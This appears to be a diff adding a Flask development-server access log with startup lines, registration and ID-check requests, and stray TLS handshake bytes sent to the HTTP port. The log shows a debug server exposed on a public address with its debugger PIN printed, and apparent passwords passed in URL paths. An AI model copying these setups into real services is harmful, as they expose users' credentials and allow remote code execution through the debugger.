@@ -1,0 +1,1962 @@
+ * Serving Flask app 'main_1'
+ * Debug mode: on
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://103.242.175.245:5000
+Press CTRL+C to quit
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 115-489-574
+106.39.130.101 - - [09/Sep/2024 19:19:57] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 19:19:58] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 19:19:58] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 19:19:59] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 19:19:59] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 19:19:59] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 19:19:59] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 19:19:59] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 19:19:59] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 19:20:00] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 19:20:00] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 19:20:00] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 19:20:00] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 19:20:00] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 19:20:01] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 19:20:04] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 19:20:04] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 19:20:05] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 19:20:05] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 19:20:05] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 19:20:05] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 19:20:05] "GET / HTTP/1.1" 200 -
+52.167.144.59 - - [09/Sep/2024 19:25:15] "GET /robots.txt HTTP/1.1" 404 -
+157.55.39.48 - - [09/Sep/2024 19:25:23] "GET / HTTP/1.1" 200 -
+36.112.29.17 - - [09/Sep/2024 19:35:04] "GET / HTTP/1.1" 200 -
+36.112.29.17 - - [09/Sep/2024 19:35:05] "GET /favicon.ico HTTP/1.1" 404 -
+36.112.29.17 - - [09/Sep/2024 19:35:07] "GET /register HTTP/1.1" 200 -
+36.112.29.17 - - [09/Sep/2024 19:35:07] "GET /register HTTP/1.1" 200 -
+36.112.29.17 - - [09/Sep/2024 19:36:18] "GET /register HTTP/1.1" 200 -
+36.112.29.17 - - [09/Sep/2024 19:36:49] "GET /id_exist/test123 HTTP/1.1" 200 -
+36.112.29.17 - - [09/Sep/2024 19:36:49] "GET /id_get_route/test123/test123 HTTP/1.1" 200 -
+36.112.29.17 - - [09/Sep/2024 19:36:49] "GET / HTTP/1.1" 200 -
+36.112.29.17 - - [09/Sep/2024 19:36:53] "GET /idget/test123 HTTP/1.1" 200 -
+36.112.29.17 - - [09/Sep/2024 19:36:53] "GET /security_check/test123/test123 HTTP/1.1" 200 -
+36.112.29.17 - - [09/Sep/2024 19:37:18] "GET /idget/test123 HTTP/1.1" 200 -
+36.112.29.17 - - [09/Sep/2024 19:37:18] "GET /security_check/test123/test123 HTTP/1.1" 200 -
+106.39.130.24 - - [09/Sep/2024 19:37:33] "GET / HTTP/1.1" 200 -
+106.39.130.24 - - [09/Sep/2024 19:37:34] "GET /favicon.ico HTTP/1.1" 404 -
+106.39.130.24 - - [09/Sep/2024 19:37:43] "GET /idget/test123 HTTP/1.1" 200 -
+106.39.130.24 - - [09/Sep/2024 19:37:43] "GET /security_check/test123/test123 HTTP/1.1" 200 -
+36.112.29.17 - - [09/Sep/2024 19:39:59] "GET / HTTP/1.1" 200 -
+36.112.29.17 - - [09/Sep/2024 19:40:04] "GET /idget/test123 HTTP/1.1" 200 -
+36.112.29.17 - - [09/Sep/2024 19:40:04] "GET /security_check/test123/test123 HTTP/1.1" 200 -
+36.112.29.17 - - [09/Sep/2024 19:40:26] code 400, message Bad request version ('ÏäI<\x05R\x96¬=s×Â\x02\x8c\x1bá\x1aÆºÓ\x14Bi\x03³Ô\x7f\x96b\x95¶YUÚEjÈfmøæh7Ú\x03\x9bâqæÅ-\x15¨\x12\x8bõÍ=\\Lpz]')
+36.112.29.17 - - [09/Sep/2024 19:40:26] "\x16\x03\x01\x06Ù\x01\x00\x06Õ\x03\x03/¼®R\x8a~\x82,Ò9[\x1d×mH\x824jb\x847\x0dÛ\x10Þm\x90jÌ-òL \x06\x90Ê\x90ïAÕ^ãsÇÒ2\x0f\x1d4\x1d¾ÙË¤æ?/Tpafîã\x03|\x00 \x1a\x1a\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x01\x00\x06l\x8a\x8a\x00\x00\x00\x10\x00\x0e\x00\x0c\x02h2\x08http/1.1\x00\x12\x00\x00\x00\x0b\x00\x02\x01\x00\x003\x04ï\x04íªª\x00\x01\x00c\x99\x04À*ÕùhÁÍÃì8à\x0f&\x93h²jÖMÏ2/I§\x80Ik«\x92ÿ\x8b.hW\x998\x9e\x0c5\x0d×\x1c.æ?äôed(\x1b_õ\x06\x938\x05\x17ö\x9fïsÁ1\x95wJF\\ £\x95õ\x15tù\x87\x8d±Ô¶\x11\x89\x91]\x10n\x1a¼v\x99\x09\x9c\x98×?\x0b\x84G\x918#¬º<N ÏÐt¥Û\x13µ\x14´´N\x13\x89¬äiAÆ¬\x08x\x9ec\x89y\x14ø\\\x84ò\x9f¿å¼¤w<b\x10kÉ8\x0eß:\x11¢%eîË\x1c\x97\x88L{\x19;)\\¨§$]çC_\x05À\x93ã\x97xñÑ¢,k¸ïq\x99¯g3ìÈ7e¬©Å\x10³Dp\x9dk¨ CèÉÍi\x7fÎ¥C\x06wÆ\x9cI6mâ=ÍÕ\x14èØ+ÉÕy>\x8b\x1d×Ñt\x91g´ºtº\x8b\x09\x11\x0f$C\x9c$\x02\x16uÁ£Ñp"º\x01\x82\x03\\J'\x1cVy:ò³`\x0f\x84 \x81\x19Å{F\x9e^e­K\x9a=ÍC\x9fgÓ\x1b»'µ\x8f\x8c\x1bé+Ï\x9f|\x8eJÉºò¥\x81õ\x09©\x02\x15\x86·\x13^Á\x9a¯ÕÁTtC\x88·\x03\x95ÂÁ¨gT¬~h1Éå}×ìr\x85y\x09ÏäI<\x05R\x96¬=s×Â\x02\x8c\x1bá\x1aÆºÓ\x14Bi\x03³Ô\x7f\x96b\x95¶YUÚEjÈfmøæh7Ú\x03\x9bâqæÅ-\x15¨\x12\x8bõÍ=\\Lpz]" HTTPStatus.BAD_REQUEST -
+36.112.29.17 - - [09/Sep/2024 19:40:26] code 400, message Bad request syntax ('\x16\x03\x01\x06Ù\x01\x00\x06Õ\x03\x03Ù\x18ì\x14$Æ\x15¥Ü[ÒN\x9d')
+36.112.29.17 - - [09/Sep/2024 19:40:26] "\x16\x03\x01\x06Ù\x01\x00\x06Õ\x03\x03Ù\x18ì\x14$Æ\x15¥Ü[ÒN\x9d" HTTPStatus.BAD_REQUEST -
+36.112.29.17 - - [09/Sep/2024 19:40:26] code 400, message Bad request version ('\x00\x02\x01\x00\x00#\x00\x00\x00+\x00\x07\x06')
+36.112.29.17 - - [09/Sep/2024 19:40:26] "\x16\x03\x01\x06Ù\x01\x00\x06Õ\x03\x03\x12nÐVoÒPà²{\x95aL¢óªOå\x02¢ã\x96Ë¡\x03\x1a\x80t\x8b¥\x83< ÕX\x0dóÈD²ªü\x98\x00::E:\x12ÕëÂ\x8f\x8aû\x932\x04}:×#\x18up\x00 êê\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x01\x00\x06l**\x00\x00\x00\x0d\x00\x12\x00\x10\x04\x03\x08\x04\x04\x01\x05\x03\x08\x05\x05\x01\x08\x06\x06\x01\x00-\x00\x02\x01\x01\x00\x05\x00\x05\x01\x00\x00\x00\x00\x00\x17\x00\x00\x00\x1b\x00\x03\x02\x00\x02\x00\x0b\x00\x02\x01\x00\x00#\x00\x00\x00+\x00\x07\x06" HTTPStatus.BAD_REQUEST -
+36.112.29.17 - - [09/Sep/2024 19:40:26] code 400, message Bad request version ('ÊÊ\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x01\x00\x06¬')
+36.112.29.17 - - [09/Sep/2024 19:40:26] "\x16\x03\x01\x07\x19\x01\x00\x07\x15\x03\x03$!émV[\x0eÉý\x0d´¿ïbêÉð\x15\x0dü\x9frB%Cë\x05\x9fBq\x09\x0e a\x98I¥&\x08Î\x04Þ\x8fþfÈ×\x873QbÙÜ\x13YU9\x81)æü\x83\x9csw\x00 ÊÊ\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x01\x00\x06¬" HTTPStatus.BAD_REQUEST -
+36.112.29.17 - - [09/Sep/2024 19:40:26] code 400, message Bad request version ('\x1a\x1a\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x01\x00\x06lzz\x00\x00\x00\x1b\x00\x03\x02\x00\x02\x00\x17\x00\x00\x00\x12\x00\x00\x00')
+36.112.29.17 - - [09/Sep/2024 19:40:26] "\x16\x03\x01\x06Ù\x01\x00\x06Õ\x03\x03\x83\x02\x16\x8b\x8f Ü\x8b\x0f«\x02´°]=Õ%nÉ;\x0fcrpô\x9cö/\x1eu\x18P \x89ý=ï¢.¼÷Z&IÐóß1«ð6wW\x88î\x06J¡ßÑTù^ò\x1e\x00 \x1a\x1a\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x01\x00\x06lzz\x00\x00\x00\x1b\x00\x03\x02\x00\x02\x00\x17\x00\x00\x00\x12\x00\x00\x00" HTTPStatus.BAD_REQUEST -
+36.112.29.17 - - [09/Sep/2024 19:40:26] code 400, message Bad request version ('\x9c·±²«')
+36.112.29.17 - - [09/Sep/2024 19:40:26] "\x16\x03\x01\x06¹\x01\x00\x06µ\x03\x03\x1f\x1eÒßøÊ\x81Ð\x07ÞáÛ\x0fë`Ü\x06}£U\x0fíD\x8f\x16G[%ØY\x1c\x0d \x9c\x7f´ÀMV,\x1fvF\x94¶3µãóø\x8a\x10\x96W|FI¥fÿPñY%Ê\x00 zz\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x01\x00\x06LÊÊ\x00\x00\x003\x04ï\x04íúú\x00\x01\x00c\x99\x04ÀÜ\x12úJÕÃ\x9a\x85\x9c·±²«" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [09/Sep/2024 19:40:44] "GET /api/user HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:40:44] "GET /ui/assets/index-5910c523.js HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:40:44] "GET /ui/assets/index-9f2df5af.css HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:40:51] "GET /api/user HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:40:51] "GET /ui/assets/index-5910c523.js HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:40:51] "GET /ui/assets/index-9f2df5af.css HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:41:09] "GET /api/user HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:41:09] "GET /ui/assets/index-5910c523.js HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:41:09] "GET /ui/assets/index-9f2df5af.css HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:41:15] "GET /api/user HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:41:15] "GET /ui/assets/index-5910c523.js HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:41:15] "GET /ui/assets/index-9f2df5af.css HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:41:23] "GET /api/user HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:41:24] "GET /ui/assets/index-5910c523.js HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:41:24] "GET /ui/assets/index-9f2df5af.css HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:41:36] "GET /api/user HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:41:36] "GET /ui/assets/index-5910c523.js HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:41:36] "GET /ui/assets/index-9f2df5af.css HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:42:03] "GET /api/user HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:42:03] "GET /ui/assets/index-5910c523.js HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:42:03] "GET /ui/assets/index-9f2df5af.css HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:42:06] "GET /api/user HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:42:06] "GET /ui/assets/index-5910c523.js HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:42:06] "GET /ui/assets/index-9f2df5af.css HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:42:07] "GET /api/user HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:42:07] "GET /ui/assets/index-5910c523.js HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:42:07] "GET /ui/assets/index-9f2df5af.css HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:42:21] "GET /ui/ HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:42:22] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:42:45] "GET /api/user HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:42:45] "GET /ui/favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:42:46] "GET /ui/assets/index-5910c523.js HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:42:46] "GET /ui/assets/index-9f2df5af.css HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:42:59] "GET /api/user HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:42:59] "GET /ui/assets/index-5910c523.js HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 19:42:59] "GET /ui/assets/index-9f2df5af.css HTTP/1.1" 404 -
+106.39.130.24 - - [09/Sep/2024 19:46:38] "GET /idget/test123 HTTP/1.1" 200 -
+106.39.130.24 - - [09/Sep/2024 19:46:38] "GET /security_check/test123/test123 HTTP/1.1" 200 -
+106.39.130.24 - - [09/Sep/2024 19:46:44] "GET / HTTP/1.1" 200 -
+106.39.130.24 - - [09/Sep/2024 19:46:58] "GET /idget/test123 HTTP/1.1" 200 -
+106.39.130.24 - - [09/Sep/2024 19:46:58] "GET /security_check/test123/test123 HTTP/1.1" 200 -
+103.242.175.245 - - [09/Sep/2024 19:48:23] code 400, message Bad request version ("û\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+103.242.175.245 - - [09/Sep/2024 19:48:23] "\x16\x03\x01\x00½\x01\x00\x00¹\x03\x03ä\x82\x83¦\x88wS\x93\x0f\x0e\x1dÒVl|ÿëxRc·Èî¸8)Çe\x8bc\x09û\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ" HTTPStatus.BAD_REQUEST -
+103.242.175.245 - - [09/Sep/2024 19:48:36] code 400, message Bad request syntax ("\x16\x03\x01\x00½\x01\x00\x00¹\x03\x03F[\x94\x15«E\x16`×è9|`Þ\x02àeÊy9ìe½ö(ÓXðÏ\x05Æ\x96\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+103.242.175.245 - - [09/Sep/2024 19:48:36] "\x16\x03\x01\x00½\x01\x00\x00¹\x03\x03F[\x94\x15«E\x16`×è9|`Þ\x02àeÊy9ìe½ö(ÓXðÏ\x05Æ\x96\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ" HTTPStatus.BAD_REQUEST -
+103.242.175.245 - - [09/Sep/2024 19:48:36] code 400, message Bad request version ("\\\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+103.242.175.245 - - [09/Sep/2024 19:48:36] "\x16\x03\x01\x00½\x01\x00\x00¹\x03\x03ÖýÒ^\x86Z\x8b½\x16ùî'lÊEÑ*\x00a \x1då«v+è\x81ûë\x10\x1d\\\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ" HTTPStatus.BAD_REQUEST -
+103.242.175.245 - - [09/Sep/2024 19:48:37] code 400, message Bad request version ("N\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+103.242.175.245 - - [09/Sep/2024 19:48:37] "\x16\x03\x01\x00½\x01\x00\x00¹\x03\x03Qãð«\x02\x06j\x12ínj\x17\x12Èþyà¨\x0f¡q¬À?\x95\x12\x1d-ÍÖ\x85N\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ" HTTPStatus.BAD_REQUEST -
+36.112.29.17 - - [09/Sep/2024 19:48:54] code 400, message Bad request version ('½ó@ê')
+36.112.29.17 - - [09/Sep/2024 19:48:54] "\x16\x03\x01\x07\x00\x01\x00\x06ü\x03\x03\x0b\x1femo\x8b¼\x035nEÙó·}Û\x9e§\x11¢ÏhøI&æT\x89ØGWl vT\x0fI¼â\x1fÕ¯ËO÷<4©WÏ¬è.Ý¸\x19\x96Þ\x14\x8cUxÈ\x1bÓ\x00 êê\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x01\x00\x06\x93ªª\x00\x00þ\x0d\x01\x1a\x00\x00\x01\x00\x01\x16\x00 \x0b-R\x80Ð~Íý[¯\x81*\x97YN`±\x14\x86_ìàW\x15\x80ÇNØÖ\x96E\x09\x00ð6Fr,]?ÍÓöNÏ\x17P*É\x8fÿÝ¡Ê\x95k\x0cC#CA\x7fIµ\x85Æ\x91\x81>+Y°\x83\x09!Ê±hæM\x82vPà.[\x12èr°rÛÜv8Ná°Ðz\x8eP¼Ôc\x98^¾\x92Ð\x9a¤4\x7fàR\x88óß\x8eøc]Ù\x80?oO\x03\x91Ã¶X\x8c¨\x0c¿HKèFÇÇOð!_W\x7f×\x1cC¥ü\x82)ëlÏP\x18Vß/6\x8eìÎehMñ\x97\x88,Ä½Ðºß\x9dJ\x85½ó@ê" HTTPStatus.BAD_REQUEST -
+36.112.29.17 - - [09/Sep/2024 19:48:54] code 400, message Bad request version ('ZZ\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x01\x00\x06\x93ÚÚ\x00\x00\x00')
+36.112.29.17 - - [09/Sep/2024 19:48:54] "\x16\x03\x01\x07\x00\x01\x00\x06ü\x03\x03\x8cI\x89=ôj[q \x8d\x9caûÖ\x90ì{\x18ÓÞ¥¿7¬\x04{^Á³ýý  ¡`\x84äR¾Ý©\x02â×\x19þ³Ã\x8fôÏ)\x08¯Õÿ\x1a[\x91c^P²\x0cj\x00 ZZ\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x01\x00\x06\x93ÚÚ\x00\x00\x00" HTTPStatus.BAD_REQUEST -
+36.112.29.17 - - [09/Sep/2024 19:48:54] code 400, message Bad request version ('\x19ZùYQ%ãV\x10\x92\x9bf\x97-\x02')
+36.112.29.17 - - [09/Sep/2024 19:48:54] "\x16\x03\x01\x06 \x01\x00\x06\x9c\x03\x03³g\x03¨r\x06ÁCWkè]¾\x16\x1e\x8e\x0b\x88\x12ã\x01\x12\x09\x9dP\x8aZ\x83\x14QPx ZÒ\x8c¡¶»e\x90h\x82Ò~AÁ\x15\x03P©\x19\x9f¬4ûH\x1dhZhÃXW+\x00 jj\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x01\x00\x063\x1a\x1a\x00\x00þ\x0d\x00º\x00\x00\x01\x00\x01/\x00 \x19ZùYQ%ãV\x10\x92\x9bf\x97-\x02" HTTPStatus.BAD_REQUEST -
+36.112.29.17 - - [09/Sep/2024 19:48:54] code 400, message Bad request version ('\x00º\x00\x00\x01\x00\x01')
+36.112.29.17 - - [09/Sep/2024 19:48:54] "\x16\x03\x01\x06 \x01\x00\x06\x9c\x03\x03g(\x88 \x0b\x03°\x13Àw\x95\x07ûMë\x95­/0\x87\x17ý¥Àþ\x85äÎô7\x00C Æ\x89\x09Qm­ÁÔ¿Åxd£Ñ´Í\x12\x9fhÆ\x09Uh8ï$@Ô­D\x8a*\x00 JJ\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x01\x00\x063ZZ\x00\x00Di\x00\x05\x00\x03\x02h2\x00\x1b\x00\x03\x02\x00\x02\x00\x0d\x00\x12\x00\x10\x04\x03\x08\x04\x04\x01\x05\x03\x08\x05\x05\x01\x08\x06\x06\x01þ\x0d\x00º\x00\x00\x01\x00\x01" HTTPStatus.BAD_REQUEST -
+36.112.29.17 - - [09/Sep/2024 19:49:06] "GET / HTTP/1.1" 200 -
+103.242.175.245 - - [09/Sep/2024 19:49:11] "GET /api/user HTTP/1.1" 404 -
+103.242.175.245 - - [09/Sep/2024 19:49:11] "GET /ui/assets/index-5910c523.js HTTP/1.1" 404 -
+103.242.175.245 - - [09/Sep/2024 19:49:11] "GET /ui/assets/index-9f2df5af.css HTTP/1.1" 404 -
+103.242.175.245 - - [09/Sep/2024 19:49:29] "GET / HTTP/1.1" 200 -
+103.242.175.245 - - [09/Sep/2024 19:49:34] "GET /idget/test123 HTTP/1.1" 200 -
+103.242.175.245 - - [09/Sep/2024 19:49:34] "GET /security_check/test123/test123 HTTP/1.1" 200 -
+103.242.175.245 - - [09/Sep/2024 19:49:57] "GET /ui/login HTTP/1.1" 404 -
+36.112.29.17 - - [09/Sep/2024 19:51:43] "GET / HTTP/1.1" 200 -
+123.119.236.209 - - [09/Sep/2024 19:51:45] "GET / HTTP/1.1" 200 -
+123.119.236.209 - - [09/Sep/2024 19:51:45] "GET /favicon.ico HTTP/1.1" 404 -
+123.119.236.209 - - [09/Sep/2024 19:51:55] "GET /idget/test123 HTTP/1.1" 200 -
+123.119.236.209 - - [09/Sep/2024 19:51:55] "GET /security_check/test123/test123 HTTP/1.1" 200 -
+123.119.236.209 - - [09/Sep/2024 19:52:56] "GET /idget/test123 HTTP/1.1" 200 -
+123.119.236.209 - - [09/Sep/2024 19:52:56] "GET /security_check/test123/test12 HTTP/1.1" 200 -
+123.119.236.209 - - [09/Sep/2024 19:53:06] "GET / HTTP/1.1" 200 -
+123.119.236.209 - - [09/Sep/2024 19:53:06] "GET /favicon.ico HTTP/1.1" 404 -
+123.119.236.209 - - [09/Sep/2024 19:53:08] "GET /register HTTP/1.1" 200 -
+123.119.236.209 - - [09/Sep/2024 19:53:08] "GET /register HTTP/1.1" 200 -
+123.119.236.209 - - [09/Sep/2024 19:53:24] "GET /id_exist/hy HTTP/1.1" 200 -
+123.119.236.209 - - [09/Sep/2024 19:53:24] "GET /id_get_route/123456/123456 HTTP/1.1" 200 -
+123.119.236.209 - - [09/Sep/2024 19:53:24] "GET / HTTP/1.1" 200 -
+123.119.236.209 - - [09/Sep/2024 19:53:31] "GET /idget/hy HTTP/1.1" 200 -
+123.119.236.209 - - [09/Sep/2024 19:53:31] "GET /security_check/hy/123456 HTTP/1.1" 200 -
+123.119.236.209 - - [09/Sep/2024 19:53:36] "GET /register HTTP/1.1" 200 -
+123.119.236.209 - - [09/Sep/2024 19:53:36] "GET /register HTTP/1.1" 200 -
+123.119.236.209 - - [09/Sep/2024 19:53:55] "GET /id_exist/123 HTTP/1.1" 200 -
+123.119.236.209 - - [09/Sep/2024 19:54:03] "GET /id_exist/123456 HTTP/1.1" 200 -
+123.119.236.209 - - [09/Sep/2024 19:54:17] "GET /id_exist/8756 HTTP/1.1" 200 -
+123.119.236.209 - - [09/Sep/2024 19:54:17] "GET /id_get_route/8756/8756 HTTP/1.1" 200 -
+123.119.236.209 - - [09/Sep/2024 19:54:17] "GET / HTTP/1.1" 200 -
+123.119.236.209 - - [09/Sep/2024 19:54:26] "GET /idget/8756 HTTP/1.1" 200 -
+123.119.236.209 - - [09/Sep/2024 19:54:26] "GET /security_check/8756/8756 HTTP/1.1" 200 -
+123.119.236.209 - - [09/Sep/2024 19:57:07] "GET / HTTP/1.1" 200 -
+123.119.236.209 - - [09/Sep/2024 19:57:07] "GET /favicon.ico HTTP/1.1" 404 -
+123.119.236.209 - - [09/Sep/2024 19:57:34] "GET / HTTP/1.1" 200 -
+123.119.236.209 - - [09/Sep/2024 19:57:34] "GET /favicon.ico HTTP/1.1" 404 -
+123.6.49.12 - - [09/Sep/2024 19:57:46] "GET / HTTP/1.1" 200 -
+123.6.49.47 - - [09/Sep/2024 19:57:46] "GET / HTTP/1.1" 200 -
+123.119.236.209 - - [09/Sep/2024 19:57:48] "GET /idget/test123 HTTP/1.1" 200 -
+123.119.236.209 - - [09/Sep/2024 19:57:48] "GET /security_check/test123/test123 HTTP/1.1" 200 -
+123.119.236.209 - - [09/Sep/2024 20:01:02] "GET /idget/test123 HTTP/1.1" 200 -
+123.119.236.209 - - [09/Sep/2024 20:01:02] "GET /security_check/test123/test123 HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:20:13] "GET /register HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:20:13] "GET /register HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:23:05] "GET /id_exist/test HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:23:05] "GET /id_get_route/218218/218218 HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:23:05] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:23:08] "GET /register HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:23:08] "GET /register HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:23:14] "GET /id_exist/123456 HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:25:33] "GET /register HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:25:33] "GET /register HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:25:41] "GET /id_exist/test HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:25:41] "GET /id_get_route/218218/218218 HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:25:41] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:26:32] "GET /idget/123456 HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:26:32] "GET /security_check/123456/123456 HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:26:35] "GET /idget/test HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:26:35] "GET /security_check/test/218218 HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:26:35] "GET /idget/test HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:26:35] "GET /security_check/test/218218 HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:26:35] "GET /idget/test HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:26:35] "GET /idget/test HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:26:35] "GET /idget/test HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:26:35] "GET /idget/test HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:26:35] "GET /idget/test HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:26:35] "GET /idget/test HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:26:35] "GET /idget/test HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:26:35] "GET /idget/test HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:26:35] "GET /security_check/test/218218 HTTP/1.1" 200 -
